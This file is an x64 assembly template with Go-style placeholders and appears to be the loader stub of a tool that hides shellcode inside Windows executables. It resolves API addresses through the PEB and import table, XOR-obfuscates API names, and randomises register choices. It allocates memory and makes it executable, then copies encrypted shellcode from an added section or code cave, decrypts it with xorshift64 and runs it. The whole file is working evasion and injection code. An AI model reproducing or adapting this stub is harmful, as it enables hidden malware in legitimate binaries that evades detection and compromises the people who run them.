.code64

// rdi store address of ImageBaseAddress
// rsi store address of kernel32.dll
// rbx store address of LoadLibrary
// r12 store address of GetProcAddress
// r13 store address of VirtualAlloc
// r14 store address of VirtualProtect
// r15 store address of CreateThread

entry:
// get core procedure address
{{if .LackProcedure}}
  // push kernel32 module name to stack
  mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}
  mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}
  xor {{.Reg.rax}}, {{.Reg.r8}}
  push {{.Reg.rax}}
  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB 1}}
  mov {{.Reg.r9}},  {{index .Kernel32DLLKey 1}}
  xor {{.Reg.rbx}}, {{.Reg.r9}}
  push {{.Reg.rbx}}

  {{if .LoadLibraryWOnly}}
    mov {{.Reg.rcx}}, {{index .Kernel32DLLDB 2}}
    mov {{.Reg.r10}}, {{index .Kernel32DLLKey 2}}
    xor {{.Reg.rcx}}, {{.Reg.r10}}
    push {{.Reg.rcx}}
    mov {{.Reg.rdx}}, {{index .Kernel32DLLDB 3}}
    mov {{.Reg.r11}}, {{index .Kernel32DLLKey 3}}
    xor {{.Reg.rdx}}, {{.Reg.r11}}
    push {{.Reg.rdx}}
  {{end}}

  // get pointer to the PEB
  xor {{.Reg.rax}}, {{.Reg.rax}}
  mov {{.Reg.rax}}, 0x60
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
  // store image base address
  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]

  // read the LoadLibraryA/W form IAT
  mov {{.RegN.rbx}}, {{.RegN.rdi}}
  add {{.RegN.rbx}}, {{hex .LoadLibrary}}
  mov {{.RegN.rbx}}, [{{.RegN.rbx}}]

  // load kernel32.dll
  mov rcx, rsp
  sub rsp, 0x20
  call {{.RegN.rbx}}
  add rsp, 0x20

  // store the handle of kernel32.dll
  mov {{.RegN.rsi}}, rax

  // restore stack for kernel32 module name
  {{if .LoadLibraryWOnly}}
    add rsp, 4*8
  {{else}}
    add rsp, 2*8
  {{end}}

  // read the GetProcAddress form IAT
  mov {{.RegV.rax}}, {{.RegN.rdi}}
  add {{.RegV.rax}}, {{hex .GetProcAddress}}
  mov {{.RegN.r12}}, [{{.RegV.rax}}]

  // get procedure address of VirtualAlloc
  {{if .LackVirtualAlloc}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualAllocDB 0}}
    mov {{.RegV.r8}},  {{index .VirtualAllocKey 0}}
    xor {{.RegV.rax}}, {{.RegV.r8}}
    push {{.RegV.rax}}
    mov {{.RegV.rcx}}, {{index .VirtualAllocDB 1}}
    mov {{.RegV.r9}},  {{index .VirtualAllocKey 1}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}
    push {{.RegV.rcx}}
    // call GetProcAddress
    mov rcx, {{.RegN.rsi}}
    mov rdx, rsp
    sub rsp, 0x20
    call {{.RegN.r12}}
    add rsp, 0x20
    mov {{.RegN.r13}}, rax
    // restore stack for procedure name
    add rsp, 2*8
  {{else}}
    mov {{.RegV.rcx}}, {{.RegN.rdi}}
    add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
    mov {{.RegN.r13}}, [{{.RegV.rcx}}]
  {{end}}

  // get procedure address of VirtualProtect
  {{if .LackVirtualProtect}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualProtectDB 0}}
    mov {{.RegV.r8}},  {{index .VirtualProtectKey 0}}
    xor {{.RegV.rax}}, {{.RegV.r8}}
    push {{.RegV.rax}}
    mov {{.RegV.rcx}}, {{index .VirtualProtectDB 1}}
    mov {{.RegV.r9}},  {{index .VirtualProtectKey 1}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}
    push {{.RegV.rcx}}
    // call GetProcAddress
    mov rcx, {{.RegN.rsi}}
    mov rdx, rsp
    sub rsp, 0x20
    call {{.RegN.r12}}
    add rsp, 0x20
    mov {{.RegN.r14}}, rax
    // restore stack for procedure name
    add rsp, 2*8
  {{else}}
    mov {{.RegV.rdx}}, {{.RegN.rdi}}
    add {{.RegV.rdx}}, {{hex .VirtualProtect}}
    mov {{.RegN.r14}}, [{{.RegV.rdx}}]
  {{end}}

  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    {{if .LackCreateThread}}
      // push procedure name to stack
      mov {{.RegV.rax}}, {{index .CreateThreadDB 0}}
      mov {{.RegV.r8}},  {{index .CreateThreadKey 0}}
      xor {{.RegV.rax}}, {{.RegV.r8}}
      push {{.RegV.rax}}
      mov {{.RegV.rcx}}, {{index .CreateThreadDB 1}}
      mov {{.RegV.r9}},  {{index .CreateThreadKey 1}}
      xor {{.RegV.rcx}}, {{.RegV.r9}}
      push {{.RegV.rcx}}
      // call GetProcAddress
      mov rcx, {{.RegN.rsi}}
      mov rdx, rsp
      sub rsp, 0x20
      call {{.RegN.r12}}
      add rsp, 0x20
      mov {{.RegN.r15}}, rax
      // restore stack for procedure name
      add rsp, 2*8
    {{else}}
      mov {{.RegV.r8}}, {{.RegN.rdi}}
      add {{.RegV.r8}}, {{hex .CreateThread}}
      mov {{.RegN.r15}}, [{{.RegV.r8}}]
    {{end}}
  {{end}}

{{else}}

  // get pointer to the PEB
  xor {{.Reg.rax}}, {{.Reg.rax}}
  mov {{.Reg.rax}}, 0x60
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
  // store image base address
  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]

  // get procedure address of VirtualAlloc
  mov {{.RegV.rcx}}, {{.RegN.rdi}}
  add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
  mov {{.RegN.r13}}, [{{.RegV.rcx}}]
  // get procedure address of VirtualProtect
  mov {{.RegV.rdx}}, {{.RegN.rdi}}
  add {{.RegV.rdx}}, {{hex .VirtualProtect}}
  mov {{.RegN.r14}}, [{{.RegV.rdx}}]
  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    mov {{.RegV.r8}}, {{.RegN.rdi}}
    add {{.RegV.r8}}, {{hex .CreateThread}}
    mov {{.RegN.r15}}, [{{.RegV.r8}}]
  {{end}}

{{end}}

  // allocate memory for shellcode
  xor rcx, rcx
  mov rdx, {{hex .MemRegionSize}}
  mov r8, 0x3000  // MEM_RESERVE|MEM_COMMIT
  mov r9, 0x04    // PAGE_READWRITE
  sub rsp, 0x20
  call {{.RegN.r13}}
  add rsp, 0x20

  // store allocated memory address
  // and ensure stack is 16 bytes aligned
  sub rsp, 0x10
  mov [rsp], rax

  // padding garbage data to page
  mov {{.RegV.rdx}}, rax
  mov {{.RegV.rcx}}, {{hex .EntryOffset}}
  // calculate a random seed from registers
  add {{.RegV.rax}}, {{.Reg.rbx}}
  add {{.RegV.rax}}, {{.Reg.rcx}}
  add {{.RegV.rax}}, {{.Reg.rdx}}
  add {{.RegV.rax}}, {{.Reg.rsi}}
  add {{.RegV.rax}}, {{.Reg.rdi}}
  add {{.RegV.rax}}, {{.Reg.r8}}
  add {{.RegV.rax}}, {{.Reg.r9}}
  add {{.RegV.rax}}, {{.Reg.r10}}
  add {{.RegV.rax}}, {{.Reg.r11}}
  next1:
  call xor_shift
push rax
  mov rax, {{.RegV.rax}}
  mov [{{.RegV.rdx}}], al
pop rax
  // check padding garbage is finish
  inc {{.RegV.rdx}}
  dec {{.RegV.rcx}}
  test {{.RegV.rcx}}, {{.RegV.rcx}}
  jz break1
  jmp next1
  break1:

  // adjust memory region protect
  sub rsp, 0x10 // for store old protect
  mov rcx, [rsp + 0x10]
  mov rdx, {{hex .MemRegionSize}}
  mov r8, 0x40 // PAGE_EXECUTE_READWRITE
  mov r9, rsp
  sub rsp, 0x20
  call {{.RegN.r14}}
  add rsp, 0x20
  add rsp, 0x10 // restore stack

// read shellcode from extended section or code cave
{{if .SectionMode}}
  // extract encrypted shellcode from extended section
  push rsi
  push rdi
  mov rsi, {{.RegN.rdi}}
  add rsi, {{hex .SectionOffset}}
  mov rdi, [rsp + 0x10]
  add rdi, {{hex .EntryOffset}}
  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
  next2:
  movsb
  inc rsi
  // check extract shellcode is finish
  dec {{.RegV.rcx}}
  test {{.RegV.rcx}}, {{.RegV.rcx}}
  jz break2
  jmp next2
  break2:
  pop rdi
  pop rsi

  // decrypt shellcode in the memory page
  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}
  mov {{.RegV.rdx}}, [rsp]
  add {{.RegV.rdx}}, {{hex .EntryOffset}}
  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
  next3:
  mov {{.RegV.r8}}, [{{.RegV.rdx}}]
  xor {{.RegV.r8}}, {{.RegV.rax}}
  mov [{{.RegV.rdx}}], {{.RegV.r8}}
  // update the key with xorshift64
  call xor_shift
  // check decrypt shellcode is finish
  add {{.RegV.rdx}}, 8
  sub {{.RegV.rcx}}, 8
  test {{.RegV.rcx}}, {{.RegV.rcx}} // TODO improve it
  jz break3
  jmp next3
  break3:

{{else}}
  // extract encrypted shellcode from code cave
  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
  mov {{.RegN.rdi}}, [rsp]
  add {{.RegN.rdi}}, {{hex .EntryOffset}}
  {{STUB CodeCaveMode STUB}}
{{end}}

  // get the shellcode entry point
  mov {{.RegV.rax}}, [rsp]
  add {{.RegV.rax}}, {{hex .EntryOffset}}

  // restore stack about allocated memory address
  add rsp, 0x10

  // call the shellcode
  sub rsp, 0x20
  call {{.RegV.rax}}
  add rsp, 0x20

  // mark the end of shellcode
  int3

xor_shift:
  mov {{.RegV.r8}}, {{.RegV.rax}}
  shl {{.RegV.r8}}, 13
  xor {{.RegV.rax}}, {{.RegV.r8}}
  mov {{.RegV.r8}}, {{.RegV.rax}}
  shr {{.RegV.r8}}, 7
  xor {{.RegV.rax}}, {{.RegV.r8}}
  mov {{.RegV.r8}}, {{.RegV.rax}}
  shl {{.RegV.r8}}, 17
  xor {{.RegV.rax}}, {{.RegV.r8}}
  ret
